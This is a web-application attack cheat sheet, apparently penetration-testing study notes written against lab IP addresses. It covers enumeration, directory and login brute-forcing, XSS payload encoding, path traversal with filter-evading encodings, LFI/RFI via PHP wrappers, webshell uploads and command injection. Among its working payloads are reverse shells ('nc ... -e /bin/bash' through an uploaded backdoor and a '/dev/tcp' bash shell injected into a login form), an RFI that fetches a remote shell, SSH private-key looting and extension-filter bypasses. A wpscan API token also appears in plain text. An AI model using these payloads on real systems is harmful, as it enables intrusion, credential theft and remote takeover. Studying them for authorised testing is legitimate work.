---
title: Web Application Attacks
---
# Enumeration
## Identify Technology with 404 Pages
- Consult [Default 404 Pages](https://0xdf.gitlab.io/cheatsheets/404#) for a list of default 404 pages
 
## Nmap
- Use `--script=http-enum` to fingerprint a webapplication
```zsh
sudo nmap -p80 --script=http-enum 192.168.50.20
```

## Feroxbuster 
- We can use `feroxbuster` to perform a directory bruteforce
```zsh
feroxbuster -u http://myweb:5000 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o feroxbuster_5000
```
>[!WARNING]
>Feroxbuster will not connect to hosts presenting self-signed certificates with TLS by default. To enable this, we need to add the parameter `-k` or `--insecure`

> [!HINT] 
> - Add `-x {webtechnology},pdf,txt,config` to the query to search for files
> ```zsh 
> feroxbuster -u http://192.168.211.199 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x aspx,txt,pdf,config
> ```
>

## FFUF
- We can perform a login bruteforce attack using `ffuf`. Copy the login request from Burp to a file and modify it to contain the FUZZ parameters. Then use `ffuf` to bruteforce. We can also use multiple wordlists
```zsh
ffuf -request login.req -request-proto http -w passwords.txt

ffuf -request login.req -request-proto http -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200 -fs 100

```
- The `-mc` parameter will only match HTTP status code 200
- The `-fs` parameter will filter out responses of size 100
- We can check if we can reach any hidden ports by sending traffic through a proxy with `ffuf`
```zsh
for port in $(seq 1 65535); do echo $port >> ports; done

ffuf -w ports -x http://192.168.116.189:3128 -u http://127.0.0.1:FUZZ -fw 319    
```
- The `-fw` parameter will filter out responses with a word count of 319
## Gobuster
- We can use gobusters `-p` option to specify patterns. A pattern file can be provided. The placeholder `{GOBUSTER}` will be replaced with values from our wordlist. 
```zsh
{GOBUSTER}/v1
{GOBUSTER}/v2

gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
## CURL
- Issue POST Request with `curl` using the `-d` and `-H` options
```zsh
curl -X 'POST' -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```
- Add the `--proxy` parameter to `curl` to add a proxy. Or use `burl` which is aliased to `curl -x http://127.0.0.1:8080/ -k` 
- We can also post data with the option `--data-urlencode`
```zsh
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash" 
```

## Wpscan
- If we encounter a wordpress instance, we can use `wpscan` to enumerate it
- A basic enumeration can be done by just adding the URL
```zsh
wpscan --url http://websrv1 --api-token quNPrJLpaM4CXAxSncwQHDFqp4C2AC5djCkUcSZjmsU
```
- To enumerate plugins, we add the `--enumerate p` to enumerate the most popular plugins as well as the `--plugins-detection aggressive` as parameters.
```zsh
wpscan --url http://websrv1 y --api-token quNPrJLpaM4CXAxSncwQHDFqp4C2AC5djCkUcSZjmsU
```
> [!HINT]
> To enumerate all plugins simply remove the `--enumerate p` parameter. This scan will take some time however.

## WebDAV
- If we find that WebDAV is running (as indicted by nmap scan), we can use `cadaver` to interact with it and potentially even upload files
```zsh
#Connect by supplying the address of the WebDAV server
cadaver http://192.168.120.108

#Authenticating might be needed
Authentication required for 192.168.120.108 on server '192.168.120.108':
Username: Alexa
Password: Password123

#Afterwards, we can interact with WebDAV
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
Uploading /usr/share/webshells/aspx/cmdasp.aspx to '/cmdasp.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
dav:/> 
```
## Send Requests through Burp
- We can use `burl` which is aliased to `curl -x http://127.0.0.1:8080/ -k` to send curl requests through Burp
- In Python, we can use the `proxies` parameter to send requests through burp
```python
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

res = requests.get(url + '/alexa/somepage',proxies=proxies, verify=False)

test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload,proxies=proxies, verify=False)
```
# XSS
- We can encode our java script payload to make sure that bad characters are not being an issue while sending it. 
```JS
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
- The encoded string can then be executed using `eval()`
```JS
<script>eval(String.fromCharCode(ENCODED_PAYLOAD))</script>
```

# Path Traversal
- Use the option `--path-as-is` when using `curl`. Otherwise the path will get squased
```zsh
curl --path-as-is http://192.168.248.193:3000/public/plugins/alertlist/../../../../../conf/defaults.ini
```
## Common Paths
#### Linux
- Common paths to test
```zsh
/etc/passwd
/home/userfrompasswd/.ssh/id_rsa
``` 
> [!IMPORTANT]
> SSH private keys can potentially have different names. Check for them using 
> ```zsh
> for privkey in $(cat private_key_names); do ./apache_2.4.49_rce.sh targets.txt /home/anita/.ssh/$privkey; done
> ```
> A list of common names for private keys can be found on [Github](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)
#### Windows
- Common paths to test
```zsh
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config -- IIS config
C:\inetpub\logs\LogFiles\W3SVC1\ -- IIS logs directory
```
- We do not need to specify the drive letter upon reaching the root node
```zsh
curl --path-as-is http://192.168.248.193:3000/public/plugins/alertlist/../../../../../../../../Windows/System32/drivers/etc/hosts

```
## Encoding
- As the pattern `../` often gets detected, we can encode it to avoid this
	- Encode `.` as `%2e`
	- Encode `/` as `%2f`
```zhs
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
- Consult [PayloadAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md) for more potential encodings like double encodings

# File Inclusions
## Local File Inclusion (LFI)
### Log Poisoning
- We can potentially poison logs with executable command and then include the log with LFI
- Common Log Locations
```zsh
/var/log/apache2/access.log
C:\xampp\apache\logs\
```

### Process Information
- We might get information about the running process by reading the file `/proc/self/cmdline` 
### PHP Wrappers
#### `php://filter`
- In case we do not want the included file to be executed, we can use the `php://filter` wrapper
```zsh
curl http://offsec.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
- The `ressource` parameter is required to specify the file stream for filtering. 
- For a list of available filters check the [PHP Documentation](https://www.php.net/manual/en/filters.php) or [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter) 
#### `data://`
- The `data://` wrapper can be used to achieve code execution
- In order for this wrapper to work `allow_url_include` must be enabled in PHP
```zsh
curl http://offsec.com/index.php?page=data://text/plain,<?php%20echo%20system('whoami');?>

echo -n '<?php echo system($_GET["cmd"]); ?>' | base64

curl http://offsec.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4=&cmd=ls
```
- Use `data://text/plain;base64,` to bypass trivial filters
#### `zip://` 
- We can use the `zip://` to read zip-files and access elements in it
- If we have the ability to upload custom zip-files this might lead to remote code execution as shown [here](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/) or on [Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=zip%20wrapper#zip-and-rar)
```zsh
# Creating a simple webshell
echo "<?php system($_GET['cmd']); ?>" > payload.php
# Zipping it
zip payload.zip payload.php

# Accessing the log file via LFI (the # identifier is URL-encoded)
curl "http://192.168.177.229/index.php?file=zip://payload.zip%23payload.php&cmd=id"
```

### Remote File Inclusion (RFI)
- In PHP `allow_url_include` must be configured for RFI to work, just like the `data://` filter in LFI
- Allows us to include file from a remote location using `HTTP` or `SMB`
```zsh
curl http://offsec.com/index.php?page=http://192.168.48.240/revshell.php
```
> [!IMPORTANT]
> If a revershell does not work, try simpler payloads like `<?php system("whoami");?>` or `<?php phpinfo();?>` to confirm command execution via RFI

# File Uploads
### Executable Files
- If we have a filter that prevents us from uploading certain files we can try to bypass it
	- Change to an uncommon file extension (e.g `.php` to `php7` or `phps` )
	- Change casing (e.g `.php` to `.pHP`)
- Check [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html#bypass-file-extensions-checks) for usefull extensions and bypass tricks
- It is also worth checking if we can rename files. So we could upload our payload as `.txt` (or whatever is allowed) and then rename it 
- If we are able to upload a `.htaccess` we might be able to add a new PHP file type or even execute code as shown on [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution)
```zsh
echo "AddType application/x-httpd-php .alexa" > .htaccess
```
### Unexecutable Files
- Always try to upload the same file twice. Depending on the response we might be able to enumerate the web framework or enumerate files that were already uploaded
- If files get overwritten, check for path traversal vulnerabilities. This way we could overwrite file in order to get access (e.g by overwriting `authorized_keys`)
# Command Injection
- Check if we can change the command that is being ran (e.g `whoami` instead of `git clone`)
- Check if we are confined within a specific command (e.g `git` or `git version` instead of `git clone`) 
- Check if used command can be escaped (e.g using `"` or `'`). Be sure to URL encode accordingly like the below payload `username=&password=&ffa=test"&&bash -c 'bash -i >& /dev/tcp/192.168.45.234/9001 0>&1'"`
```zsh
curl -X POST --data 'username=&password=&ffa=test%22%26%26bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.234%2F9001+0%3E%261%27%22' http://192.168.231.16/login
```
- Check if we can chain commands (e.g `git clone;whoami` instead of `git clone`)
	- `;` can be used in a majority of command lines. In `cmd` an alternative is using `&&`
	- Be wary of encoding (e.g `git clone%3Bwhoami` instead of `git clone;whoami`)

## Windows
- To check if the command gets executed using `cmd` or `powershell` we can use
```zsh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

# Request smuggling
- In case we have multiple HTTP servers handling our request there might be potential for [request-smuggling](https://portswigger.net/web-security/request-smuggling)
- This can be done in multiple way, an example of this would be [Gunicorn 20.0.4](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/) 
- Try to use the simple `X-Forwarded-For: localhost` header before trying anything convoluted